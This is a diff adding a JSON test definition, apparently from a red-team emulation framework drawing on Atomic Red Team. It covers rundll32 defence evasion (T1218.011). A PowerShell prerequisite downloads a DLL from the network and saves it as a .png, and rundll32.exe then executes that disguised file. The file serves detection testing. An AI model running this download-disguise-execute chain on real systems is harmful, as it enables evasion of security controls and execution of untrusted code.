@@ -1,0 +1,41 @@
+{
+    "name": "Execution of non-dll using rundll32.exe",
+    "description": "Rundll32.exe running non-dll  ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "command": "rundll32.exe #{input_file}, StartW\n",
+        "type": "Command Executor"
+    },
+    "id": "T1218.011",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Rundll32",
+    "source": "ART",
+    "uuid": "ae3a8605-b26e-457c-b6b3-2702fd335bac",
+    "arguments": {
+        "input_url": {
+            "description": "Url to download the DLL",
+            "type": "url",
+            "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"
+        },
+        "input_file": {
+            "description": "Non-dll file",
+            "type": "string",
+            "default": "C:\\Users\\$env:username\\Downloads\\calc.png"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Non-dll file must exist on disk at specified location\n",
+            "prereq_command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
